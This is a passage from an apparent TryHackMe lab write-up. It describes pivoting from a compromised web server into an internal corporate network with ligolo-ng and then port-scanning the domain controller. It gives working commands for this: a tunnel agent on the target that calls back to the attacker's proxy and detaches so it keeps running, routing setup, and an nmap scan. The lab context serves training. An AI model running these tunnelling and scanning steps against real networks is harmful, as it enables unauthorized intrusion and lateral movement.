Pivoting into the internal network (192.168.11.0/24)

The web server (192.168.11.200) is dual-homed — it sits on both the VPN-facing side and the internal corporate LAN.
I can reach the web box, but not the DC (192.168.11.100) or WRK (192.168.11.51) behind it. 
The fix is to tunnel through my svc-drop foothold using ligolo-ng. 
The agent was already present in svc-drop’s home dir; I just needed the proxy on my attack box.

Download the matching proxy on the attack box:
bash
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.9.2/ligolo-ng_proxy_0.9.2_linux_amd64.tar.gz
tar -xf ligolo-ng_proxy_0.9.2_linux_amd64.tar.gz
chmod +x proxy        # NOTE: binary is named 'proxy', not 'ligolo-proxy'

Create the tun interface and start the proxy (attack box):
bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert     # listens on 0.0.0.0:11601

Confirm my tun0 (VPN) IP — this is the callback address the agent connects to:
bash
ip addr show tun0     # 192.168.21.3

Run the agent on the target (svc-drop SSH session), pointing at the proxy:
bash
setsid ./ligolo-ng_agent_0.9.2_linux_amd64 -connect 192.168.21.3:11601 -ignore-cert -retry &

(-retry keeps it reconnecting; setsid … & detaches it so an SSH hiccup doesn’t kill it.)

In the proxy console (the ligolo-ng » prompt), select the session and start the tunnel:
session     # pick: svc-drop@tryhackme-2404
start

Mistake I made here (and the fix): I first added a route for the whole subnet:

bash
sudo ip route add 192.168.11.0/24 dev ligolo     # <-- WRONG, caused problems

This hijacked the web server’s own IP (192.168.11.200) into the tunnel — I lost the ability to reach the foothold, 
and the agent’s keepalive died (yamux: keepalive failed: i/o deadline reached).

The fix: delete the broad route and add per-host /32 routes for only the internal targets, 
leaving the web server reachable normally:
bash
sudo ip route del 192.168.11.0/24 dev ligolo      # recover access to .200
sudo ip route add 192.168.11.100/32 dev ligolo    # DC
sudo ip route add 192.168.11.51/32 dev ligolo     # WRK

Also note: the ligolo console only understands ligolo commands. Scanning tools (nmap, nxc) run in a separate normal terminal,
not in the proxy prompt.

Scanning the internal hosts (through the tunnel)

Windows blocks ICMP, so a ping sweep (-sn) shows nothing. Use a TCP connect scan with -Pn:
bash
nmap -sT -Pn -p 88,389,445,3389 192.168.11.100 192.168.11.51

Results:

192.168.11.100 (DEADDROP-DC):  88 kerberos, 389 ldap, 445 smb, 3389 rdp  → OPEN  (Domain Controller)
192.168.11.51  (DEADDROP-WRK): all filtered (host firewall)

The DC is my target and fully reachable; WRK is firewalled off.

